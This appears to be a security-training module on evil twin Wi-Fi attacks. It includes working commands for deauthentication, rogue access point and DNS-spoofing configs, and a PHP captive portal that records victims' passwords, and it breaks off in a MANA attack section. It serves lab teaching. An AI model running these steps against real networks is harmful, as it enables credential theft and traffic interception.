# Introduction to Evil Twin Attacks

* * *

## Rogue Access Point

A [rogue access point](https://en.wikipedia.org/wiki/Rogue_access_point) is a wireless access point that imitates a legitimate one and is set up without the explicit authorization of the network administrator. It can be deployed either by a well-meaning employee or a malicious attacker, potentially posing significant security risks to the network.

Rogue access points can be categorized into two types:

1. `Wired Rogue Access Points`: These are unauthorized access points connected directly to the secure internal network, often posing a serious security threat as they provide a backdoor into the network.
![intro](https://academy.hackthebox.com/storage/modules/291/intro/001.png)
2. `External Rogue Access Points`: These are unauthorized access points not connected to the secure network. If one is found to be malicious or a potential risk—such as attracting or having already connected secure network wireless clients, it is classified as a rogue access point of the second kind, commonly referred to as an evil twin.
![intro](https://academy.hackthebox.com/storage/modules/291/intro/002.png)

In this module, we will focus on the second type, the `External Rogue Access Points` , also known as the `Evil Twin`. For simplicity, we will use the terms rogue access point or fake access point interchangeably with evil twin throughout the module. We'll explore how to conduct evil twin attacks on `WPA2`, `WPA3`, and `Enterprise` networks, both manually and with automated tools. We'll dive into popular tools like Fluxion, Airgeddon, WiFi-Pumpkin3, WiFi-Phisher, and EAPHammer to perform these attacks. Additionally, we'll cover few MiTM (Man-in-the-Middle) techniques such as DNS spoofing, bypassing MFA with Evilginx2, and SSL interception. Finally, we'll demonstrate how to leverage the [Flipper Zero](https://flipperzero.one/) device to create a rogue access point and host a captive portal to capture user credentials.

* * *

### 802.11 Roaming

The [802.11 protocol](https://en.wikipedia.org/wiki/Service_set_(802.11_network)) enables client devices (stations) to seamlessly roam between access points (APs) within the same [Extended Service Set (ESS)](https://en.wikipedia.org/wiki/Service_set_(802.11_network)#Extended_service_set). However, the standard does not define specific criteria for selecting an AP when multiple options are available within the ESS. Typically, client devices are designed to choose the access point offering the best connection. This decision is usually based on factors such as signal strength, throughput, and signal-to-noise ratio. Similar to automatic network selection, client devices rely on the ESSID field in beacon frames to identify which nearby access points belong to their current ESS.
![intro](https://academy.hackthebox.com/storage/modules/291/intro/003.gif)

* * *

### Abusing 802.11 Roaming

The 802.11 roaming process can be exploited by creating a rogue access point (AP) that uses the same ESSID as the target network. By offering a stronger signal than the legitimate access points, we can cause client devices connected to the target network to roam to our rogue AP. This can be achieved through one of two methods:

1. `Enticement`: Providing a stronger signal than the target access point to entice client devices to voluntarily connect to the rogue AP created by attacker.
2. `Coercion`: Forcing client devices to disconnect from the target access point using techniques like deauthentication packets, jamming, or other denial-of-service (DoS) attacks. This compels the devices to roam to the rogue AP created by attacker.

Both methods allow an attacker to intercept and manipulate the communication of client devices as they connect to the rogue access point.

* * *

## How Does an Evil Twin Attack Work?

1. `Fake Access Point Setup`: The attacker sets up a rogue access point (AP) mimicking the legitimate network by using the same SSID.
2. `Deauthentication and User Connection`: The attacker broadcasts deauthentication packets to force clients off the real network, compelling them to reconnect to the open rogue AP.
3. `Traffic Monitoring and Captive Portals`: Once connected to the rogue AP, the attacker may block internet access and redirect users to a fake captive portal. The captive portal mimics a legitimate login page, tricking users into providing their network credentials.

For `WPA-PSK` networks, evil twin attacks are generally more effective. The attacker typically begins by creating a rogue access point (AP) with the same name as the legitimate one but configured as an `open` network instead of using WPA2 authentication. To force clients to disconnect from the real AP, the attacker sends deauthentication packets, prompting users to manually select another Wi-Fi network. When clients connect to the rogue AP, their internet traffic is blocked, and users are redirected to a fake captive portal created by the attacker to steal their credentials.

`WPA3` networks offer enhanced protection against deauthentication attacks due to the use of [PMF (Protected Management Frames)](https://www.wi-fi.org/beacon/philipp-ebbecke/protected-management-frames-enhance-wi-fi-network-security) protection. Even though an attacker can set up a rogue AP with the same name as the legitimate one and configure it as an `open` network, they cannot effectively perform deauthentication attacks to force client disconnections. However, evil twin attacks against WPA3 remain feasible through `collision events` that create Denial of Service (DoS) conditions. In this approach, the attacker creates a rogue AP with the same name (ESSID) and BSSID as the legitimate AP, configured with a fake password and WPA2 authentication using mana-loud (we'll cover the mana attack later). This setup creates a collision where clients are unable to connect to either AP, causing a denial-of-service condition. The attacker can then deploy an open rogue AP with the same name, enticing clients to connect and exposing them to potential credential theft.

Evil twin attacks on `WPA Enterprise` networks differ from those on WPA2 or WPA3 networks. Unlike PSK-based networks, where all users share a common passphrase, WPA Enterprise assigns each user unique credentials. To carry out the attack, an attacker sets up a rogue enterprise AP configured with a `RADIUS` server that accepts all authentication requests, regardless of validity. The rogue AP uses the same SSID as the legitimate one to trick users into connecting. When users connect using challenge-response methods such as CHAP, MSCHAP, or MSCHAPv2, their authentication hashes can be captured. These hashes can either be brute-forced locally to reveal the credentials or relayed in a PEAP attack to authenticate directly with the legitimate AP. If users connect using plain-text methods like GTC, their credentials are immediately exposed in clear text.

* * *

## Next Steps

In the following sections we will do a deep dive into evil twin attacks, including:

- Evil Twin Attack on WPA2
- Karma & Mana Attacks
- Evil Twin Attack on WPA3
- Enterprise Evil Twin Attack

Each of these attacks is possible during real-world assessments so its important to be familiar with these and able to boast further knowledge. Developing a deeper understanding of these attacks not only enhances assessment capabilities but also strengthens defense strategies, ultimately boosting your expertise in wireless security assessments. In the next section, we will explore how to manually perform an evil twin attack against a `WPA2` network.


# Evil Twin Attack on WPA2

* * *

The evil twin attack on WPA2 involves creating a rogue access point (AP) that mimics a legitimate one, tricking unsuspecting clients into connecting to it. The primary difference here is that the identical rogue access point is an `open` network. Once connected, the attacker can intercept sensitive data or perform further exploitation, such as phishing for credentials using captive portals or executing man-in-the-middle (MITM) attacks.

![intro](https://academy.hackthebox.com/storage/modules/291/intro/002.png)

Unlike automated tools, a manual evil-twin attack gives attackers fine-grained control over every stage of the process, from crafting the fake AP to managing connected clients. This approach provides a deeper understanding of the mechanisms and allows customization to bypass security measures configured by clients.

In this section, we’ll explore how to set up a manual evil-twin attack on a WPA2 network, focusing on following steps:

1. `Monitor the target & capture valid WPA handshake` : The first step is to perform reconnaissance on the target network to gather critical details such as the network name (SSID), BSSID, authentication type, and other relevant information. Once this data is collected, we use airodump-ng to capture a valid handshake. This handshake will later be used to validate the network credentials during the attack process.
2. `Configure the routing` : The next step is to configure routing correctly, along with setting up the DNS and DHCP servers for the fake access point. These services will assign IP addresses to connected clients and handle their network requests, ensuring seamless connectivity that mimics the legitimate access point. Additionally, configure the wireless interface hosting the fake access point with an appropriate IP address and modify its MAC address to closely resemble that of the target access point for added authenticity.
3. `Setup the captive portal` : The next step is to set up a captive portal that will display a login page to the victim (client). This portal is designed to capture any credentials entered by the victim, allowing us to collect the necessary authentication details for further exploitation.
4. `Spin up the fake access point` : Next, we launch the fake open access point using `hostapd`, ensuring it has a network name (ESSID) identical to the target and a BSSID that closely resembles the target's. This enhances the illusion of legitimacy, increasing the chances of the victim connecting to this rogue access point.
5. `Capture & Validate the credentials` : Finally, once the victim connects to the fake access point and enters their login credentials through the captive portal, we capture these credentials. We then validate them against the real target network to ensure their authenticity. This step confirms that the obtained credentials are correct and can be used for further exploitation or access to the target network.

To ensure a successful setup, we need at least two wireless interfaces that support monitor mode and packet injection. These can be either two 2.4 GHz interfaces, two 5 GHz interfaces, or one of each, depending on the target network. The reason for this is that hosting the fake access point is resource-intensive for the wireless card, and we still need to perform monitoring and deauthentication/disassociation attacks. Therefore, we dedicate one card to host the fake AP (e.g., `wlan1`) and the other to monitor the network and handle deauthentication/disassociation (e.g., `wlan0`). This setup ensures that both tasks can be performed simultaneously without overloading a single interface.

Note: All the commands shown in this module should be run as root. Use 'sudo -s' to switch to the root user.

* * *

## Performing the Attack:

* * *

### 1\. Monitor the target & capture valid WPA handshake

First, we need to set our interface to monitor mode using `airmon-ng`.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

Next, we will use `airodump-ng` to scan for available Wi-Fi networks. To save the scan results for later analysis, we use the `--write` (or `-w`) parameter followed by a filename. This writes the output to a file with the specified prefix, enabling us to efficiently store and review the captured data.

```shell
airodump-ng wlan0mon -w HTB -c 1

11:32:13  Created capture file "HTB-01.cap".

 CH 1 ][ Elapsed: 6 s ][ 2024-11-27 11:55

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 D4:C1:8B:79:AD:45  -28        7        2    0   1   54   WPA2 TKIP   PSK  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 D4:C1:8B:79:AD:45  C2:CA:2A:79:D5:87  -29   54 -48      0        2

```

Now, we need to deauthenticate the connected client using aireplay-ng. This forces the client to disconnect from the legitimate access point, prompting it to reconnect. During this reconnection process, we can capture a valid WPA handshake, which is essential for validating the network credentials later.

```shell
aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon

11:51:19  Waiting for beacon frame (BSSID: D4:C1:8B:79:AD:45) on channel 1
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
11:51:19  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:20  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:20  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:21  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:21  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]

```

Once the clients are deauthenticated from the AP, we can continue observing `airodump-ng` to see when they reconnect.

```shell
airodump-ng wlan0mon -w HTB

CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: D4:C1:8B:79:AD:45

 CH 10 ][ Elapsed: 6 s ][ 2024-11-27 11:55

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 D4:C1:8B:79:AD:45  -28        7        2    0   1   54   WPA2 TKIP   PSK  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 D4:C1:8B:79:AD:45  C2:CA:2A:79:D5:87  -29   54 -48      0        2

```

In the output above, we can see that after sending the deauthentication packet, the client disconnects and then reconnects. This is evidenced by the increase in Lost packets and Frames count. Additionally, a four-way handshake would be captured by airodump-ng, as shown in the output.

* * *

### 2\. Configure the routing

The next step is to configure routing by setting up the DNS and DHCP servers for the fake access point. These services will assign IP addresses to connected clients and handle their network requests, ensuring seamless connectivity that mimics the legitimate access point.

To configure the routing correctly, we need to follow these steps:

- `Set up DNS and DHCP for the fake network` : Configure DNS and DHCP services for the rogue access point, ensuring clients receive valid IP addresses and can resolve domain names.
- `Assign a valid IP address to the wireless interface` : Configure the wireless interface hosting the fake access point (e.g., wlan1) with a proper IP address to ensure proper routing.
- `Modify the MAC address of the wireless interface` : Change the MAC address of the wlan1 interface to closely resemble that of the target access point. This helps make the fake AP appear more legitimate to connected clients.

We can use `dnsmasq` to configure DNS and DHCP for the `wlan1` interface. To get started, we need to create a `dns.conf` file with the following contents:

```dns.conf
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries

```

In the above config file, we specify many parameters. These parameters can be broken down like the following:

| Item | Description |
| --- | --- |
| `Interface` | The interface which we will be hosting the access point on. |
| `dhcp-range` | This specifies that the DHCP server will provide IP addresses to connected clients starting from 192.168.0.2 up to 192.168.0.254, and each client will receive a lease for 10 hours. Once the lease time expires, the client will need to request a new IP address. |
| `DHCP option 3` | This option specifies the default gateway for the DHCP clients. In this case, dhcp-option=3,192.168.0.1 tells the clients to use 192.168.0.1 as their gateway, which will be the IP address of the fake access point (wlan1). |
| `DHCP option 6` | This option specifies the DNS server that the DHCP clients should use. By setting dhcp-option=6,192.168.0.1, the clients are directed to use the IP address of the fake AP (192.168.0.1) as their DNS server, instead of any DNS servers provided by the legitimate gateway or the target network. This ensures that DNS queries are handled by the attacker's fake AP, which can be used to intercept, manipulate, or redirect DNS requests. |
| `server` | This line tells dnsmasq to forward any DNS queries from the connected clients to the public DNS server at 8.8.4.4 & 8.8.8.8. |
| `listen-address` | The listen-address option in the dnsmasq configuration file specifies the IP address on which dnsmasq will listen for incoming DNS requests. |
| `address` | This line would make dnsmasq return the IP address 192.168.0.1 when clients try to resolve any domain. The # symbol is a wildcard that matches any domain. |
| `log-dhcp` | The log-dhcp option in dnsmasq enables logging of DHCP (Dynamic Host Configuration Protocol) activity. When this option is activated, dnsmasq will log each DHCP event, such as IP address assignments, leases, and client interactions with the DHCP server. |
| `log-queries` | The log-queries option in dnsmasq enables logging of all DNS queries made by clients. When this option is activated, dnsmasq will log each DNS request it receives, along with details such as the queried domain, the source IP address of the client, and the response sent back. |

We can start dnsmasq with the following command:

```shell
sudo dnsmasq -C dns.conf -d

dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.0.2 -- 192.168.0.254, lease time 10h
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 127.0.0.53#53
dnsmasq: read /etc/hosts - 7 names

```

If it fails to start, it likely means that another service is already using port 53. In this case, we'll need to identify and stop the process occupying the port. We can do this by running:

```shell
sudo lsof -i :53

COMMAND   PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd-r 231 systemd-resolve   13u  IPv4  36129      0t0  UDP localhost:domain
systemd-r 231 systemd-resolve   14u  IPv4  36130      0t0  TCP localhost:domain (LISTEN)

```

```shell
sudo systemctl stop systemd-resolved

```

The next step is to configure the valid IP address for the interface that will host the fake access point ( `wlan1`).

```shell
sudo ifconfig wlan1 192.168.0.1/24
ifconfig wlan1
wlan1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.0.1  netmask 255.255.255.0  broadcast 192.168.0.255
        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Additionally, we need to ensure that IP forwarding is enabled on the machine to allow proper routing of traffic between the fake access point and the internet. We can do this by running:

```shell
echo 1 > /proc/sys/net/ipv4/ip_forward

```

Next, we will change the MAC address of the `wlan1` interface to closely resemble that of the legitimate access point. This can be done using the `macchanger` tool.

We won't make the MAC address identical, but instead, we'll make it very similar. For example, if the real MAC address is `D4:C1:8B:79:AD:45`, we can change it to `D4:C1:8B:79:AD:44` (noticing the change from 45 to 44). This subtle modification helps the fake AP appear more legitimate while maintaining its distinct identity.

```shell
ifconfig wlan1 down
macchanger -m D4:C1:8B:79:AD:44 wlan1
Current MAC:   02:00:00:00:03:00 (unknown)
Permanent MAC: 02:00:00:00:03:00 (unknown)
New MAC:       D4:C1:8B:79:AD:44 (unknown)
ifconfig wlan1 up
ifconfig wlan1
wlan1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.0.1  netmask 255.255.255.0  broadcast 192.168.0.255
        ether d4:c1:8b:79:ad:44  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Lastly, we start `dnsspoof` on the `wlan1` interface to redirect all traffic from the victim's device to our attacker's IP address. This step allows us to intercept and monitor the client's communications.

```shell
sudo dnsspoof -i wlan1

dnsspoof: listening on wlan1 [udp dst port 53 and not src 192.168.0.1]

```

* * *

### 3\. Setup the captive portal

For our manual Evil-Twin attack setup, we will use an Apache server with PHP to capture credentials. This setup provides flexibility, allowing us to easily switch between different templates for our attack. Additionally, by utilizing the Apache rewrite engine and redirecting all traffic to our web server, we can ensure that users are prompted to log in to our network. The goal is to lure users into clicking the sign-in prompt, which will direct them to our captive portal, where their credentials can be captured.

![wpa2](https://academy.hackthebox.com/storage/modules/291/wpa2/captive.png)

The captive portal is pre-configured within the lab environment, allowing us to focus directly on executing the attack and analyzing the results without manually setting up and configuring the entire infrastructure. The following setup steps are provided solely for demonstration purposes.

We install the necessary tools required to host a captive portal using following command:

```shell
sudo apt-get install apache2 php libapache2-mod-php

```

Then we want to activate the rewrite engine for Apache

```shell
sudo a2enmod rewrite

```

Then we need to change part of our apache configuration file located at `/etc/apache2/apache2.conf` to allow overrides. We replace `AllowOverride none` with `AllowOverride all` for our relevant directories. For Apache2 we will be using the default `/var/www/html` directory for our captive portal.

We change a portion of the configuration file to have the following.

#### Original Config

```Apache2.conf
...
<Directory />
	Options FollowSymLinks
	AllowOverride None
	Require all denied
</Directory>
<Directory /var/www/>
	Options Indexes FollowSymLinks
	AllowOverride None
	Require all granted
</Directory>

```

#### With Modifications

```Apache2.conf
...
<Directory />
	Options FollowSymLinks
	AllowOverride All
	Require all denied
</Directory>
<Directory /var/www/>
	Options Indexes FollowSymLinks
	AllowOverride All
	Require all granted
</Directory>
...

```

At this point we need to setup an `.htacces` file. This defines rules for our web server, that notifies stations connected to our fake AP that they need to sign in through the captive portal. We do so in the `/var/www/html` directory.

```.htaccess
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule . index.html [L]

```

Then we save the .htaccess file and restart apache2.

```shell
service apache2 restart

```

If a user enters their password a POST request is sent to `received.php` which consists of the following

```php
<?php
if(isset($_POST['submit'])) {
    $password = $_POST['password'];

    $data = $password . "\r\n";
    $ret = file_put_contents('passes.lst', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('An error has occurred');
    }
    else {
        echo "Thank you for signing in. You will be redirected shortly!";
    }
}
else {
   die('No post data to process');
}
?>

```

The `received.php` file simply takes the user input and writes it to `passes.lst`, our dictionary. We will be using this dictionary later in order to validate the captured pre-shared keys against the handshake with CowPatty. When testing this form, if an error message is displayed by received.php, it is commonly a permissions issue, which can be resolved with the following command.

```shell
sudo chown -R www-data:www-data /var/www/html/passes.lst

```

* * *

### 4\. Spin up the fake access point

To set up our rogue access point, we use the following configuration file and save it as `hostapd.conf`:

```configuration
interface=wlan1
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211

```

Once the configuration file is ready, we launch the rogue access point using `hostapd`:

```shell
hostapd hostapd.conf

rfkill: Cannot open RFKILL control device
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED

```

Initially, we can wait for clients to connect to our rogue access point (AP) naturally. However, if no connections occur after a reasonable amount of time, we can forcefully encourage clients to connect by performing a deauthentication attack against the legitimate AP. This attack disconnects clients from the legitimate network, making them more likely to connect to our rogue AP.

To execute a deauthentication attack, we can use aireplay-ng:

```shell
aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon

11:51:19  Waiting for beacon frame (BSSID: D4:C1:8B:79:AD:45) on channel 1
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
11:51:19  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:20  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:20  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:21  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:21  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]

```

Once a client connects to our rogue AP, the `hostapd` output would be similar to the following:

```shell
hostapd apd.conf

rfkill: Cannot open RFKILL control device
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
wlan0: STA C2:CA:2A:79:D5:87 IEEE 802.11: authenticated
wlan0: STA C2:CA:2A:79:D5:87 IEEE 802.11: associated (aid 1)
wlan0: AP-STA-CONNECTED C2:CA:2A:79:D5:87
wlan0: STA C2:CA:2A:79:D5:87 RADIUS: starting accounting session D82057CD7522F435

```

Additionally, we would observe a DHCP request from the client for an IP address in the `dnsmasq` tab, confirming that the client is attempting to communicate through the rogue access point.

```shell
sudo dnsmasq -C dns.conf -d

dnsmasq-dhcp: 2979841318 available DHCP range: 192.168.0.2 -- 192.168.0.254
dnsmasq-dhcp: 2979841318 client provides name: client
dnsmasq-dhcp: 2979841318 DHCPREQUEST(wlan0) 192.168.0.232 C2:CA:2A:79:D5:87
dnsmasq-dhcp: 2979841318 tags: wlan0
dnsmasq-dhcp: 2979841318 DHCPACK(wlan0) 192.168.0.232 C2:CA:2A:79:D5:87 client

```

* * *

### 5\. Capture & Validate the credentials

After a client successfully connects, they will be redirected to our fake captive portal, which would look like following:

![manual](https://academy.hackthebox.com/storage/modules/291/captive_.PNG)

If the client enters their password, the credentials will be captured and saved in the `passes.lst` file.

```shell
cat /var/www/html/passes.lst
<SNIP>

```

After the victim enters the correct password in the captive portal, we can enable internet access for them by configuring the iptables firewall rules. This step is crucial to avoid raising suspicion and maintain the connection.

```shell
iptables --append POSTROUTING --table nat --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT

```

- The first rule enables NAT masquerading, allowing traffic from the rogue AP to route through the attacker's internet-connected interface (eth0).
- The second rule accepts traffic from the rogue AP interface (wlan0), allowing clients to communicate with external networks.

* * *

## Key Considerations:

The success of this evil twin attack depends on the following key factors:

- `Signal Dominance`: Ensure the rogue AP consistently provides a stronger signal to maintain the client's connection.
- `Captive Portal Realism`: The success of the attack depends on the captive portal's design. It must convincingly imitate the legitimate login page.
- `Credential Validation`: Ensure that only valid credentials are used, avoiding detection from repeated incorrect login attempts.


# Karma & Mana Attacks

* * *

Wireless network attacks often exploit the way devices automatically connect to known Wi-Fi networks. Two such attacks, `KARMA` and `MANA`, leverage this behavior to trick devices into connecting to malicious access points, enabling attackers to intercept sensitive data. In this section, we will delve into the workings of KARMA and MANA attacks and their impact on connected client devices. For a deeper understanding, we highly recommend exploring these detailed posts by SpecterOps: [Part-1](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee) and [Part-2](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9).

* * *

### Preferred Network List (PNL)

Whenever a station (client) connects to a wireless network, the network's ESSID (Extended Service Set Identifier) is saved in the station's Preferred Network List (PNL). The PNL is an organized list of all the networks the station has previously connected to. Each entry in the PNL includes the ESSID of the network along with the specific configuration details required to reconnect to it.

* * *

### Passive Scanning by Clients

During passive scanning, the client device monitors beacon frames broadcasted by nearby access points. By default, many client devices are set to automatically connect to networks stored in their Preferred Network List (PNL). If the device detects a beacon frame with an ESSID that matches an entry in its PNL, it will automatically establish a connection with the access point that sent the frame.

When clients are configured for passive scanning, attackers won't be able to see what SSIDs they are probing for, as they do not actively send out probe requests. Instead, passive scanning relies on listening to the beacon frames broadcasted by nearby access points.

For instance, the output of `airodump-ng` for clients configured for passive scanning will show no probe requests from the clients.

```shell
airodump-ng wlan0mon

CH  8 ][ Elapsed: 6 s ][ 2024-11-29 17:37

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
(not associated)   8A:EB:7E:F9:15:3E  -49    0 - 1      0        2
(not associated)   3A:00:0A:1B:21:24  -49    0 - 1     34        4

```

As shown in the above output the `Probes` column in the airodump-ng output is blank as clients are configured for passive scanning.

* * *

### Active Scanning by Clients

The second network selection method in the 802.11 protocol is known as Active Scanning. Client devices using this method actively transmit probe request frames to identify nearby access points (APs) and their capabilities. Probe requests come in two types: `directed` and `broadcast`.

1. `Directed Probe Requests`: These are addressed to a specific ESSID and are used by the client to check whether a particular network from its Preferred Network List (PNL) is nearby. Directed probing is also the only method to detect hidden networks, as it specifically targets their ESSID.
2. `Broadcast Probe Requests`: These are sent with the SSID field set to NULL, making the request addressable to all nearby access points. This allows the client to determine if any of its preferred networks are available without explicitly revealing the contents of its PNL.

Both types of probing serve to identify potential networks for connection, but broadcast probing adds a layer of privacy by avoiding direct disclosure of the networks in the client’s PNL.

For clients configured for active scanning, the output of `airodump-ng` will display the SSID(s) that the clients are actively probing for in the `Probes` column.

```shell
airodump-ng wlan0mon

CH  8 ][ Elapsed: 6 s ][ 2024-11-29 17:37

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
(not associated)   8A:EB:7E:F9:15:3E  -49    0 - 1      0        2         HackMe
(not associated)   3A:00:0A:1B:21:24  -49    0 - 1     34        4         HackTheWireless

```

* * *

## KARMA Attack

In a Karma attack, the rogue access point created by attacker listens for directed probe requests sent by client devices searching for networks in their Preferred Network List (PNL). When it detects a directed probe request, the rogue AP responds with a directed probe response that matches the requested ESSID. The client, believing it has found a trusted network from its PNL, connects to the rogue access point, enabling the attacker to intercept and manipulate the device's traffic.

![karma](https://academy.hackthebox.com/storage/modules/291/karma/karma.png)

* * *

## MANA Attack

The MANA attack, developed by Dom White and Ian de Villiers, is an `advanced version of the KARMA attack` to address advancements in client device security that have rendered KARMA attacks less effective. In this method, the rogue access point (AP) created by attacker actively reconstructs the Preferred Network Lists (PNLs) of nearby devices. When a client device sends probe requests, the rogue AP records the device's MAC address in a main hash table. Each MAC address then maps to a secondary hash table containing the ESSIDs the device has probed for. This structure allows the rogue AP to systematically monitor and log the networks preferred by each device, particularly those using directed probing.

There are two notable variations of the MANA attack that build upon its foundational principles:

1. `Loud MANA Attack`: This is an enhanced variation of the MANA attack, introduced by Dom White and Ian de Villiers. In this attack, the rogue access point (AP) transmits beacon and probe response frames for every ESSID found in the combined set of all Preferred Network Lists (PNLs) of nearby devices. By leveraging this union of ESSIDs, the rogue AP can cast a wide net, increasing its chances of enticing devices to connect.

2. `Known Beacon Attack`: Developed by George Chatzisofroniou, this attack uses brute force to discover the PNLs of nearby devices. The rogue AP broadcasts beacon frames for a predefined list of [known ESSIDs](https://gist.github.com/jgamblin/da795e571fb5f91f9e86a27f2c2f626f), attempting to match an ESSID within the target device’s PNL. When a match occurs, the device is tricked into connecting to the rogue AP


The Karma and MANA attacks are usually most effective when clients are configured for active scanning. However, they can also work with passive scanning by broadcasting multiple popular SSIDs, including those commonly used by the target network. This approach can still attract clients, particularly if they have previously connected to those SSIDs.

Thus, the `Loud MANA` attack, an advanced variant of the KARMA attack, is the most effective method for targeting modern wireless devices configured for `active` scanning. On the other hand, the `Known Beacon` attack is a more effective approach for targeting devices configured for `passive` scanning.

In this section we will utilize [hostapd-mana](https://github.com/sensepost/hostapd-mana) to execute the `MANA` attack, which is designed to respond to all client probes and establish rogue access points to capture sensitive information.

* * *

## Performing the Attack

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```shell
airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    184 avahi-daemon
    204 wpa_supplicant
    208 avahi-daemon
    231 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy5	wlan3		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

```

Once our interface is in monitor mode, we can use `airodump-ng` to scan for available Wi-Fi networks and their associated clients.

```shell
airodump-ng wlan0mon

CH  8 ][ Elapsed: 6 s ][ 2024-11-29 17:37

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
(not associated)   8A:EB:7E:F9:15:3E  -49    0 - 1      0        2         HackMe
(not associated)   3A:00:0A:1B:21:24  -49    0 - 1     34        4         HackTheWireless

```

From the output above, we observe two clients probing for access points named "HackMe" and "HackTheWireless." However, since these access points are not in range, the clients are unable to establish a connection.
The client probing for "HackMe" has the MAC address 8A:EB:7E:F9:15:3E, while the client probing for "HackTheWireless" has the MAC address 3A:00:0A:1B:21:24.

* * *

### MANA Attack on WPA/WPA2 Networks

To execute the MANA attack, we create a configuration file named `hostapd.conf`.

```configuration
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=Anything
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=Anything

# Mana Configuration
enable_mana=1
mana_loud=1

```

In this file, we specify many parameters. These parameters can be broken down like the following:

| Item | Description |
| --- | --- |
| `SSID` | The SSID of the AP we want to set |
| `Interface` | The interface which we will be hosting the access point on. |
| `Channel` | Configures the access point to operate on selected Wi-Fi channel |
